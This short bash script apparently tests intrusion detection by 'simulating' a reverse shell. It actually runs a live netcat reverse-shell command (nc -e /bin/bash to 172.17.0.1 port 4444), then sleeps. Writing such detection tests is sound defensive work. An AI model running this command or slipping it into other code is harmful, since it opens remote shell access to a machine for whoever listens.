#!/bin/bash
echo "Simulating reverse shell attempt..."
# This will fail unless something is listening, but the network activity will be caught
nc -e /bin/bash 172.17.0.1 4444 || echo "Connection failed, but attempt logged."
sleep 1000
